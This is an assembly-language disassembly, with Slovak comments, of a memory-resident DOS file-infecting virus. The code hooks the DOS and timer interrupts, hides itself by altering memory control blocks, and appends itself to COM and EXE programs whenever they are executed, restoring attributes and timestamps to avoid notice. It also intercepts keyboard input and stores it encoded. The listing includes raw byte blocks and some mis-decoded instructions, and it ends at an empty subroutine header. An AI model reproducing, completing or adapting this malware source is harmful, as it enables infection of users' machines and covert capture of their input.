MCB_type	equ	0
MCB_owner 	equ	1
MCB_size	equ	3
data_3e 	equ	12h
data_4e 	equ	0
data_5e 	equ	2
data_6e 	equ	4
data_7e 	equ	6
data_8e 	equ	8
data_9e 	equ	0Ah
data_12e	equ	0Eh
data_13e	equ	10h
data_14e	equ	11h
data_15e	equ	12h
data_16e	equ	18h
data_17e	equ	1Ah
data_18e	equ	1Ch
data_19e	equ	1Eh
data_20e	equ	20h
old_21		equ	2Ah
data_22e	equ	2Eh
data_23e	equ	30h
data_24e	equ	32h
data_25e	equ	34h
old_1c		equ	36h
data_27e	equ	3Ah
data_28e	equ	3Ch
data_29e	equ	3Eh
data_30e	equ	56h
data_31e	equ	58h
data_32e	equ	5Ah
data_33e	equ	5Bh
data_34e	equ	5Ch
data_35e	equ	5Dh
data_36e	equ	5Eh
data_37e	equ	5Fh
data_38e	equ	62h
data_39e	equ	66h
data_40e	equ	68h

newcom		segment	byte
		assume	cs:newcom, ds:newcom

		org	100h

start:		jmp	start_virus
old_program:	mov	ah,9
		int	21h			;Display char string at DS:DX
		mov	ax,4C00h
		int	21h			;Terminate with al=return code
		db	0,0,0,0,0,0
		db	8,0
		db	92 dup (0)
text		db	'Hello virus !$'

; ----------------------------------------------------------------------------
; Tu zacina zamotne telo virusu	(Offset 180h)
; ----------------------------------------------------------------------------
		db	0, 0

run		label	byte
		db	0F4h, 7Ah, 2Ch, 0
		db	0, 0, 7Eh, 0, 0BEh
		db	0Ah

old_bytes:	mov	dx,170h			;Povodny program 20h byte
		mov	ah,9
		int	21h
		mov	ax,4C00h
		int	21h
		db	20 dup (0)

		db	97h, 0Ch, 0B5h, 7, 97h, 0Ch
		db	0B5h, 7, 56h, 1, 0F5h, 6
		db	53h, 0FFh, 0, 0F0h, 5, 0
		db	0F6h, 5Ah, 74h, 17h, 0DEh,0
		db	6Ah, 0, 2Eh, 83h, 3Eh, 0C8h
		db	6, 5Ch, 7, 70h, 0, 2Eh
		db	83h, 3Eh, 0C8h, 6, 5Ch, 7
		db	70h, 0

loc_1:		add	[bx+si],ax
		and	[bx+di],al
		add	[bx+di],al
		add	[bx+si],al
		mov	al,1
		add	[bx+si],al
		adc	[bx+si],al
		add	[bx+di],al
		add	[bp+si],al
		mov	[bx+si],ax


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
sub_1:		mov	ax,[si]
		sub	ax,0BBh
		jc	loc_3			;Jump if carry Set
		cmp	ax,8
		nop
		jc	loc_3			;Jump if carry Set

loc_2:		mov	[si],ax
		retn

loc_3:		mov	ax,9
		jmp	short loc_2		;(01F7)

; ------------------------------------------------------------------------
;			New Timer interrupt
; ------------------------------------------------------------------------
new_1c:		inc	cs:timer_count
		jmp	dword ptr cs:old_1c

; ------------------------------------------------------------------------
nutena_1:	jmp	dword ptr cs:old_21
loc_iret:	jmp	dword ptr ds:old_21	;A odtial na vir_in_memory

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_2:		mov	ah,40h			;'@'
		jmp	short loc_4		;(0218)

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_3:		mov	ah,3Fh			;'?'
loc_4:		call	sub_6			;(0224)
		jc	loc_ret_5		;Jump if carry Set
		cmp	ax,cx

loc_ret_5:	retn


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
sub_4:		xor	al,al			;Zero register

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_5:		mov	ah,42h			;'B'

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_6:		mov	bx,cs:data_27e		;(8002:003A=0)

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_7:		int	21h			;DOS Services  ah=function 45h
						; duplicate handle bx, ax=new #
		retn


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
sub_8:		push	bx
		push	ax
		mov	bx,cs:data_27e		;(8002:003A=0)
		mov	ah,45h			;'E'
		call	sub_7			;(0229)
		jc	loc_6			;Jump if carry Set
		mov	bx,ax
		mov	ah,3Eh			;'>'
		call	sub_7			;(0229)
		jmp	short loc_7		;(0244)
loc_6:		clc				;Clear carry flag
loc_7:		pop	ax
		pop	bx
		retn

		db	0B0h, 3, 0CFh
loc_8:		mov	ax,1
		push	cs
		pop	es
		inc	sp
		inc	sp
		sti				;Enable interrupts
		stc				;Set carry flag
		retf	2			;Return far
loc_9:		mov	ax,2Ch
		jmp	short loc_12		;(0297)
loc_10:		mov	al,cs:data_37e		;(8002:005F=0)
		xor	ah,ah			;Zero register
		jmp	short loc_12		;(0297)
loc_11:		mov	cs:data_37e,cl		;(8002:005F=0)
		jmp	short loc_12		;(0297)

; ---------------------------------------------------------------------------
;			New DOS interrupt
; ---------------------------------------------------------------------------
new_21:		pushf				;Push flags
		cmp	ah,4Bh			;Exec ?
		je	DOS_exec
		cmp	ah,4Ch			;Exit ?
		je	DOS_exit
		cmp	ah,8			;Standart input to AL ?
		je	DOS_input

		cmp	ah,0C5h			;Virus fun
		je	loc_12
		cmp	ax,0C545h		;Virus fun
		je	loc_9
		cmp	ax,0C607h		;Virus fun
		je	loc_10
		cmp	ax,0C602h		;Virus fun
		je	loc_11
		cmp	ax,0C603h		;Virus fun
		je	loc_8
		popf				;Pop flags
		jmp	DOS_return

loc_12:		popf				;Pop flags
		sti				;Enable interrupts
		stc				;Set carry flag
		retf	2			;Return far

DOS_input:	jmp	DOS_input_

DOS_exit:	cmp	byte ptr cs:data_58,2	;(8002:0C16=0)
		jne	loc_15			;Jump if not equal
		mov	byte ptr cs:data_49,6Fh ;(8002:0BF6=0) 'o'
		nop
		mov	byte ptr cs:data_59,1	;(8002:0C17=0)
		nop
loc_15:
		cmp	byte ptr cs:data_59,1	;(8002:0C17=0)
		jne	loc_16			;Jump if not equal
		cmp	al,0
		jne	loc_16			;Jump if not equal
		push	ax
		push	cx
		push	si
		push	di
		push	es
		push	ds
		call	sub_16			;(0A60)
		call	sub_17			;(0A7A)
		call	sub_18			;(0AB0)
		pop	ds
		pop	es
		pop	di
		pop	si
		pop	cx
		pop	ax
		mov	byte ptr cs:data_58,0	;(8002:0C16=0)
		nop
		mov	byte ptr cs:data_59,0	;(8002:0C17=0)
		nop
loc_16:
		popf				;Pop flags
		jmp	DOS_return

DOS_exec:	push	ax			;Backup AX
		xor	al,al
		xchg	al,cs:data_34e		;(8002:005C=0)
		or	al,al			;Zero ?
		pop	ax			;Restore AX
		jnz	DOS_exec_
		popf
		jmp	DOS_return

DOS_exec_:	push	es			;Backup 9x register
		push	ds
		push	bp
		push	di
		push	si
		push	dx
		push	cx
		push	bx
		push	ax
		mov	bp,sp
		cli				;Disable interrupts
		mov	bx,21h

;		shl	bx,2
		db	0c1h,0e3h,2		;Original byte for prev. instr
		mov	ax,0
		mov	es,ax
		mov	ax,cs:[30h]
		mov	es:[bx+2],ax
		mov	ax,cs:[2eh]
		mov	es:[bx],ax
		sti
		push	cs
		pop	ds
		cmp	byte ptr ds:[5ah],0
		je	loc_18
		jmp	loc_36

loc_18:		inc	byte ptr ds:data_36e	;(8002:005E=0)
		push	word ptr ss:data_12e[bp]       ; (8002:000E=0)
		push	word ptr ss:data_7e[bp] ;(8002:0006=0)
		call	sub_9			;(0605)
		lahf				;Load ah from flags
		add	sp,4
		sahf				;Store ah into flags
		jnc	loc_19			;Jump if carry=0
		jmp	loc_36			;(05B4)
loc_19:
		xor	cx,cx			;Zero register
		xor	dx,dx			;Zero register
		call	sub_4			;(0220)
		mov	dx,0Ah
		mov	cx,14h
		call	sub_3			;(0216)
		jc	loc_21			;Jump if carry Set
		mov	ax,ds:data_18e		;(8002:001C=0)
		mul	word ptr ds:data_38e	;(8002:0062=0) ax = data * ax
		mov	cx,dx
		mov	dx,ax
		call	sub_4			;(0220)
		mov	dx,0
		mov	cx,2Ah
		call	sub_3			;(0216)
		jc	loc_23			;Jump if carry Set
		cmp	word ptr ds:data_4e,7AF4h      ; (8002:0000=0)
		jne	loc_23			;Jump if not equal
		mov	ax,2Ch
		cmp	byte ptr [bp],0
		jne	loc_20			;Jump if not equal
		test	byte ptr ds:data_37e,2	;(8002:005F=0)
		dec	di
		db	6Eh
loc_20:
		inc	ax
		cmp	ds:data_5e,ax		;(8002:0002=0)
		jae	loc_21			;Jump if above or =
		xor	cx,cx			;Zero register
		xor	dx,dx			;Zero register
		call	sub_4			;(0220)
		mov	dx,0Ah
		mov	cx,20h
		call	sub_2			;(0212)
		jc	loc_21			;Jump if carry Set
		call	sub_8			;(022C)
		jnc	loc_22			;Jump if carry=0
loc_21:
		jmp	loc_35			;(05A5)
loc_22:
		mov	cx,ds:data_6e		;(8002:0004=0)
		mov	dx,ds:data_7e		;(8002:0006=0)
		call	sub_4			;(0220)
		xor	cx,cx			;Zero register
		call	sub_2			;(0212)
		jc	loc_21			;Jump if carry Set
		call	sub_8			;(022C)
		jc	loc_21			;Jump if carry Set
		jmp	short loc_19		;(0344)
loc_23:
		mov	al,2
		mov	cx,0FFFFh
		mov	dx,0FFF8h
		call	sub_5			;(0222)
		mov	dx,0Ah
		mov	cx,8
		call	sub_3			;(0216)
		jc	loc_24			;Jump if carry Set
		cmp	word ptr ds:data_12e,7AF4h	; (8002:000E=0)
		je	loc_25			;Jump if equal
		jmp	short loc_28		;(043C)
loc_24:
		jmp	loc_35			;(05A5)
loc_25:
		cmp	byte ptr ds:data_13e,23h       ; (8002:0010=0) '#'
		jae	loc_24			;Jump if above or =
		mov	cl,ds:data_14e		;(8002:0011=0)
		mov	ax,ds:data_9e		;(8002:000A=0)
		mov	ds:data_7e,ax		;(8002:0006=0)
		mov	ax,word ptr ds:data_9e+2       ; (8002:000C=0)
		sub	ax,103h
		mov	word ptr ds:data_9e+1,ax       ; (8002:000B=0)
		cmp	byte ptr ds:data_13e,9	;(8002:0010=0)
		ja	loc_26			;Jump if above
		mov	cl,0E9h
loc_26:
		mov	ds:data_9e,cl		;(8002:000A=0)
		xor	cx,cx			;Zero register
		mov	dx,cx
		call	sub_4			;(0220)
		mov	dx,0Ah
		mov	cx,3
		call	sub_2			;(0212)
		jc	loc_24			;Jump if carry Set
		call	sub_8			;(022C)
		jc	loc_24			;Jump if carry Set
		xor	cx,cx			;Zero register
		mov	dx,ds:data_7e		;(8002:0006=0)
		call	sub_4			;(0220)
		xor	cx,cx			;Zero register
		call	sub_2			;(0212)
		jc	loc_27			;Jump if carry Set
		call	sub_8			;(022C)
		jc	loc_27			;Jump if carry Set
		jmp	short loc_23		;(03C1)
loc_27:
		jmp	loc_35			;(05A5)
loc_28:
		mov	word ptr ds:data_4e,7AF4h      ; (8002:0000=0)
		mov	word ptr ds:data_5e,2Ch ;(8002:0002=0)
		mov	word ptr ds:data_8e,0ABEh      ; (8002:0008=0)
		cmp	byte ptr [bp],0
		jne	loc_27			;Jump if not equal
		test	byte ptr ds:data_37e,1	;(8002:005F=0)
		jz	loc_27			;Jump if zero
		mov	al,2
		xor	cx,cx			;Zero register
		mov	dx,cx
		call	sub_5			;(0222)
		mov	ds:data_6e,dx		;(8002:0004=0)
		mov	ds:data_7e,ax		;(8002:0006=0)
		xor	cx,cx			;Zero register
		mov	dx,cx
		call	sub_4			;(0220)
		mov	dx,0Ah
		mov	cx,20h
		call	sub_3			;(0216)
		jc	loc_27			;Jump if carry Set
		cmp	word ptr ds:data_9e,5A4Dh      ; (8002:000A=0)
		je	loc_29			;Jump if equal
		cmp	word ptr ds:data_9e,4D5Ah      ; (8002:000A=0)
		jne	loc_31			;Jump if not equal
loc_29:
		mov	byte ptr ds:data_33e,0	;(8002:005B=0)
		mov	ax,ds:data_12e		;(8002:000E=0)
		mul	word ptr ds:data_39e	;(8002:0066=0) ax = data * ax
		sub	ax,ds:data_7e		;(8002:0006=0)
		sbb	dx,ds:data_6e		;(8002:0004=0)
		jc	loc_30			;Jump if carry Set
		mov	ax,ds:data_16e		;(8002:0018=0)
		mul	word ptr ds:data_38e	;(8002:0062=0) ax = data * ax
		add	ax,ds:data_17e		;(8002:001A=0)
		mov	cx,dx
		mov	bx,ax
		mov	ax,ds:data_15e		;(8002:0012=0)
		mul	word ptr ds:data_38e	;(8002:0062=0) ax = data * ax
		mov	di,ds:data_6e		;(8002:0004=0)
		mov	si,ds:data_7e		;(8002:0006=0)
		add	si,0Fh
		adc	di,0
		and	si,0FFF0h
		sub	si,ax
		sbb	di,dx
		mov	dx,cx
		mov	ax,bx
		sub	ax,si
		sbb	dx,di
		jc	loc_32			;Jump if carry Set
		add	si,0DC0h
		adc	di,0
		sub	bx,si
		sbb	cx,di
		jnc	loc_32			;Jump if carry=0
loc_30:
		jmp	loc_35			;(05A5)
loc_31:
		mov	byte ptr ds:data_33e,1	;(8002:005B=0)
		cmp	word ptr ds:data_6e,0	;(8002:0004=0)
		jne	loc_30			;Jump if not equal
		cmp	word ptr ds:data_7e,20h ;(8002:0006=0)
		jbe	loc_30			;Jump if below or =
		cmp	word ptr ds:data_7e,0F277h	; (8002:0006=0)
		jae	loc_30			;Jump if above or =
loc_32:
		mov	cx,ds:data_6e		;(8002:0004=0)
		mov	dx,ds:data_7e		;(8002:0006=0)
		add	dx,0Fh
		adc	cx,0
		and	dx,0FFF0h
		call	sub_4			;(0220)
		xor	dx,dx			;Zero register
		mov	cx,0BE5h
		push	word ptr ds:data_37e	;(8002:005F=0)
		mov	byte ptr ds:data_37e,1	;(8002:005F=0)
		call	sub_2			;(0212)
		pop	cx
		mov	ds:data_37e,cl		;(8002:005F=0)
		jc	loc_30			;Jump if carry Set
		call	sub_8			;(022C)
		jc	loc_30			;Jump if carry Set
		mov	dx,ds:data_6e		;(8002:0004=0)
		mov	ax,ds:data_7e		;(8002:0006=0)
		add	ax,0Fh
		adc	dx,0
		and	ax,0FFF0h
		div	word ptr ds:data_38e	;(8002:0062=0) ax,dxrem=dx:ax/data
		mov	ds:data_18e,ax		;(8002:001C=0)
		cmp	byte ptr ds:data_33e,0	;(8002:005B=0)
		je	loc_33			;Jump if equal
		mul	word ptr ds:data_38e	;(8002:0062=0) ax = data * ax
		mov	byte ptr ds:data_9e,0E9h       ; (8002:000A=0)
		add	ax,557h
		mov	word ptr ds:data_9e+1,ax       ; (8002:000B=0)
		jmp	short loc_34		;(0595)
loc_33:
		mov	ds:data_20e,ax		;(8002:0020=0)
		mov	word ptr ds:data_19e,55Ah      ; (8002:001E=0)
		mul	word ptr ds:data_38e	;(8002:0062=0) ax = data * ax
		add	ax,0BE5h
		adc	dx,0
		div	word ptr ds:data_39e	;(8002:0066=0) ax,dxrem=dx:ax/data
		inc	ax
		mov	ds:data_12e,ax		;(8002:000E=0)
		mov	word ptr ds:data_9e+2,dx       ; (8002:000C=0)
		mov	ax,ds:data_15e		;(8002:0012=0)
		sub	ds:data_20e,ax		;(8002:0020=0)
		mov	si,14h
		call	sub_1			;(01EA)
		mov	si,16h
		call	sub_1			;(01EA)
loc_34:
		xor	cx,cx			;Zero register
		mov	dx,cx
		call	sub_4			;(0220)
		mov	dx,0Ah
		mov	cx,20h
		call	sub_2			;(0212)
loc_35:
		call	sub_14			;(090C)
		push	word ptr ss:data_12e[bp]       ; (8002:000E=0)
		push	word ptr ss:data_7e[bp] ;(8002:0006=0)
		call	sub_10			;(0681)
		add	sp,4
loc_36:
		mov	byte ptr ds:data_34e,0FFh      ; (8002:005C=0)
		mov	ds,ss:data_12e[bp]	;(8002:000E=0)
		mov	dx,ss:data_7e[bp]	;(8002:0006=0)
		call	sub_11			;(07ED)
		mov	bx,21h
		db	0C1h, 0E3h, 2, 0B8h, 0, 0
		db	8Eh, 0C0h, 0FBh, 8Ch, 0C8h, 26h
		db	89h, 47h, 2, 0B8h, 0EAh, 0
		db	26h, 89h, 7, 0FAh, 58h, 5Bh
		db	59h, 5Ah, 5Eh, 5Fh, 5Dh, 1Fh
		db	7, 9Dh

DOS_return:	pushf				;Push flags
		push	cs
		push	word ptr cs:data_40e	;(8002:0068=0)
		cmp	byte ptr cs:data_32e,0	;(8002:005A=0)
		jne	loc_38			;Jump if not equal
		iret				;Interrupt return

loc_38:		push	bp
		mov	bp,sp
		or	word ptr ss:data_7e[bp],100h	; (8002:0006=0)
		mov	byte ptr cs:data_32e,0	;(8002:005A=0)
		pop	bp
		iret				;Interrupt return

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_9:		push	bp
		mov	bp,sp
		push	es
		push	dx
		push	cx
		push	bx
		push	ax
		mov	ax,3300h
		call	sub_7			;(0229)
		mov	ds:data_35e,dl		;(8002:005D=0)
		mov	ax,3301h
		xor	dl,dl			;Zero register
		call	sub_7			;(0229)
		mov	ax,3524h
		call	sub_7			;(0229)
		mov	ds:data_25e,es		;(8002:0034=8002h)
		mov	ds:data_24e,bx		;(8002:0032=0)
		mov	dx,0C7h
		mov	ax,2524h
		call	sub_7			;(0229)
		mov	ax,4300h
		push	ds
		lds	dx,dword ptr ss:data_6e[bp]	; (8002:0004=0) Load 32 bit ptr
		call	sub_7			;(0229)
		pop	ds
		jc	loc_41			;Jump if carry Set
		mov	ds:data_31e,cl		;(8002:0058=0)
		test	cl,1
		jz	loc_39			;Jump if zero
		mov	ax,4301h
		push	ds
		xor	cx,cx			;Zero register
		lds	dx,dword ptr ss:data_6e[bp]	; (8002:0004=0) Load 32 bit ptr
		call	sub_7			;(0229)
		pop	ds
		jc	loc_41			;Jump if carry Set
loc_39:
		mov	ax,3D02h
		push	ds
		lds	dx,dword ptr ss:data_6e[bp]	; (8002:0004=0) Load 32 bit ptr
		call	sub_7			;(0229)
		pop	ds
		jc	loc_40			;Jump if carry Set
		mov	ds:data_27e,ax		;(8002:003A=0)
		mov	ax,5700h
		call	sub_6			;(0224)
		mov	ds:data_28e,cx		;(8002:003C=0)
		mov	ds:data_29e,dx		;(8002:003E=0)
		pop	ax
		pop	bx
		pop	cx
		pop	dx
		pop	es
		pop	bp
		clc				;Clear carry flag
		retn
  
;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
  
sub_10:
		push	bp
		mov	bp,sp
		push	es
		push	dx
		push	cx
		push	bx
		push	ax
		mov	cx,ds:data_28e		;(8002:003C=0)
		mov	dx,ds:data_29e		;(8002:003E=0)
		mov	ax,5701h
		call	sub_6			;(0224)
		mov	ah,3Eh			;'>'
		call	sub_6			;(0224)
loc_40:
		mov	cl,ds:data_31e		;(8002:0058=0)
		xor	cl,20h			;' '
		and	cl,3Fh			;'?'
		test	cl,21h			;'!'
		jz	loc_41			;Jump if zero
		mov	ax,4301h
		push	ds
		xor	ch,ch			;Zero register
		mov	cl,ds:data_31e		;(8002:0058=0)
		lds	dx,dword ptr ss:data_6e[bp]	; (8002:0004=0) Load 32 bit ptr
		call	sub_7
		pop	ds
loc_41:
		mov	ax,2524h
		push	ds
		lds	dx,dword ptr ds:data_24e	; (8002:0032=0) Load 32 bit ptr
		call	sub_7			; (0229)
		pop	ds
data_43		dw	168Ah
		db	5Dh, 0, 0B8h, 1, 33h, 0E8h
		db	57h, 0FBh, 58h, 5Bh, 59h, 5Ah
		db	7, 5Dh, 0F9h, 0C3h

; ------------------------------------------------------------------------
;			Start samotneho vira
; ------------------------------------------------------------------------
start_virus:	call	start_virus_		      ;Push offset start_virus_
start_virus_:	pop	bx
		sub	bx,start_virus_-run		;BX = offset run
		mov	byte ptr cs:[bx+data_34e],0FFh	;(8002:005C=0)
		cld
		cmp	byte ptr cs:[bx+data_33e],0	;(8002:005B=0)
		je	loc_42
		mov	si,old_bytes-run
		add	si,bx			;SI = off old_bytes
		mov	di,offset start
		mov	cx,20h			;Length backup ...
		rep	movsb			;Restore original program

		push	cs
		mov	cx,100h
		push	cx			;Push CS:0100h
		push	es			;Backup ES,DS,AX
		push	ds
		push	ax
		jmp	short obskok_1

loc_42:		mov	dx,ds
		add	dx,10h
		add	dx,cs:data_20e		;(8002:0020=0)
		push	dx
		push	word ptr cs:data_19e	;(8002:001E=0)
		push	es
		push	ds
		push	ax

obskok_1:	push	bx			;Backup BX (offset run)
		clc				;Clear carry flag
		mov	ax,0C603h		;Neexistujuca funkcia DOS
		int	21h			;Test pritomnosti v RAM
		pop	bx			;Restore offset run
		jnc	install 		;Install virus if not allow
		cmp	ax,1
		ja	vir_in_memory		;Jump if virus in memory
		call	sub_19

vir_in_memory:	pop	ax			;Restore AX,DS,ES
		pop	ds
		pop	es
		retf				;Jump to original prog.(100h)

install:	cmp	byte ptr cs:[bx+data_33e],0	;(8002:005B=0)
		je	loc_43				;Jump if equal
		cmp	sp,0FFF0h
		jb	vir_in_memory

loc_43:		mov	ax,ds			;Set ES to MCB
		dec	ax
		mov	es,ax
		cmp	byte ptr es:MCB_type,'Z' ;This memory block is last ?
		je	loc_45
		push	bx			;Backup offset run
		mov	ah,48h
		mov	bx,0FFFFh		;Maximum
		int	21h			;Test available memory block

		cmp	bx,0CFh			;Je aspon kusok volneho ?
		jb	loc_44
		mov	ah,48h			;Zaalokuj vsetko co je k disp.
		int	21h

loc_44:		pop	bx			;Restore offset RUN
		jc	vir_in_memory		;Let it be if not enought mem.

		dec	ax			;Decr. segment adress mem block
		mov	es,ax			;ES - MCB for allocated block
		cli
		mov	word ptr es:MCB_owner,0	;Nastav vlastnika bloku na 0
		cmp	byte ptr es:MCB_type,'Z';Last memory block ?
		jne	vir_in_memory

		add	ax,es:MCB_size
		inc	ax
		mov	es:data_3e,ax		;0012

loc_45:		mov	ax,es:MCB_size		;AX - size of memory block
		sub	ax,0CFh			; - virus size
		jc	vir_in_memory		;Jump if error size

		mov	es:MCB_size,ax		;Set new value
		sub	word ptr es:data_3e,0CFh ;0012  ??????
		mov	es,es:data_3e		;0012
		xor	di,di
		mov	si,bx			;CS:SI = RUN, ES:DI =new block
		mov	cx,0BE5h		;CX = virus length
		rep	movs byte ptr es:[di],cs:[si]  ;Copy virus to new block
		push	es
		pop	ds			;DS  - new segment
		push	bx			;Backup RUN
		mov	ax,3521h
		int	21h			;ES:BX = getinterupt (21h)

		mov	word ptr ds:old_21+2,es ;Backup
		mov	ds:old_21,bx
		mov	ds:data_23e,es		;0030
		mov	ds:data_22e,bx		;002E
		mov	ax,351Ch
		int	21h			;ES:BX = geninterrupt (1Ch)

		mov	word ptr ds:old_1c+2,es ;Backup
		mov	ds:old_1c,bx
		pop	bx			;Restore offset RUN
		mov	ax,2521h
		mov	dx,0EAh			;New
		int	21h			;Redefine DOS interrupt

		mov	dx,7Fh			;New
		pushf
		mov	ax,bx
		add	ax,vir_in_memory-run
		push	cs			;Push far adr. vir_in_memory
		push	ax
		cli

		pushf				;Push flag
		pop	ax                      ;Pop flag
		or	ax,100h			;Clear Trace flag (No step)
		push	ax			;Push modif. flag

		mov	ax,bx			;Offset RUN
		add	ax,loc_iret-run
		push	cs			;Push loc_iret far adress
		push	ax
		mov	ax,251Ch		;Set parameters for DOS int.
		mov	byte ptr ds:data_30e,1	;0056
		iret				;Jmp to loc_iret

;-------------------------------------------------------------------------
;			       SUBROUTINE
;-------------------------------------------------------------------------
sub_11:		mov	cx,50h
		mov	si,dx
		cld				;Clear direction
		xor	ax,ax			;Zero register
		mov	cs:data_56,ax		;(8002:0C12=0)

locloop_46:
		inc	cs:data_56		;(8002:0C12=0)
		lodsb				;String [si] to al
		or	al,al			;Zero ?
		loopnz	locloop_46		;Loop if zf=0, cx>0

		dec	cs:data_56		;(8002:0C12=0)
		mov	si,dx
		sub	cs:data_56,9		;(8002:0C12=0)
		add	si,cs:data_56		;(8002:0C12=0)
		mov	di,978h
		push	cs
		pop	es
		mov	cx,9
		cld				;Clear direction
		repe	cmpsb			;Rep zf=1+cx >0 Cmp [si] to es:[di]
		jz	loc_47			;Jump if zero
		jmp	short loc_51		;(086C)
		db	90h
loc_47:
		mov	ah,62h			;'b'
		call	sub_7			;(0229)
		mov	ds,bx
		mov	si,80h
		cld				;Clear direction
		lodsb				;String [si] to al
		cmp	al,1
		ja	loc_48			;Jump if above
		mov	byte ptr cs:data_58,1	;(8002:0C16=0)
		nop
		jmp	short loc_51		;(086C)
		db	90h
loc_48:
		mov	byte ptr cs:data_58,0	;(8002:0C16=0)
		nop
		push	cs
		pop	es
		mov	ds,bx
		mov	cx,0Fh
		mov	si,82h
		mov	di,0BE6h
		cld				;Clear direction

locloop_49:
		lodsb				;String [si] to al
		cmp	al,61h			;'a'
		jb	loc_50			;Jump if below
		and	al,0DFh
loc_50:
		add	al,62h			;'b'
		stosb				;Store al to es:[di]
		cmp	al,6Fh			;'o'
		loopnz	locloop_49		;Loop if zf=0, cx>0

		mov	al,6Fh			;'o'
		stosb				;Store al to es:[di]
		mov	byte ptr cs:data_58,2	;(8002:0C16=0)
		nop
loc_51:
		mov	cs:data_56,0		;(8002:0C12=0)
		retn

DOS_input_:	pushf				;Push flags
		push	cs
		call	sub_12
		push	ax
		push	ds
		push	si
		push	di
		push	es
		mov	ah,cs:data_58		;(8002:0C16=0)
		cmp	ah,0
		je	loc_54
		cmp	ah,1
		je	loc_53
		mov	di,0BF6h
		call	sub_13
		jnz	loc_54			;Jump if not zero
		mov	byte ptr cs:data_58,0	;(8002:0C16=0)
		nop
		mov	byte ptr cs:data_59,1	;(8002:0C17=0)
		nop
		jmp	short loc_54
		nop

loc_53:		mov	di,0BE6h
		call	sub_13			;(08C8)
		jnz	loc_54			;Jump if not zero
		mov	byte ptr cs:data_58,2	;(8002:0C16=0)
		nop
		mov	cs:data_56,0		;(8002:0C12=0)

loc_54:		pop	es
		pop	di
		pop	si
		pop	ds
		pop	ax
		popf				;Pop flags
		iret				;Interrupt return

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_12:		jmp	dword ptr cs:data_22e	;(8002:002E=0)

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_13:		add	di,cs:data_56		;(8002:0C12=0)
		cmp	al,8
		jne	loc_55			;Jump if not equal
		cmp	cs:data_56,0		;(8002:0C12=0)
		je	loc_57			;Jump if equal
		dec	cs:data_56		;(8002:0C12=0)
		jmp	short loc_57		;(0906)
		db	90h
loc_55:
		cmp	al,61h			;'a'
		jb	loc_56			;Jump if below
		and	al,0DFh
loc_56:
		push	cs
		pop	es
		inc	cs:data_56		;(8002:0C12=0)
		cmp	cs:data_56,10h		;(8002:0C12=0)
		jne	loc_57			;Jump if not equal
		dec	cs:data_56		;(8002:0C12=0)
		cmp	al,0Dh
		jne	loc_57			;Jump if not equal
		mov	cs:data_56,0		;(8002:0C12=0)
loc_57:
		add	al,62h			;'b'
		stosb				;Store al to es:[di]
		cmp	al,6Fh			;'o'
		retn


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

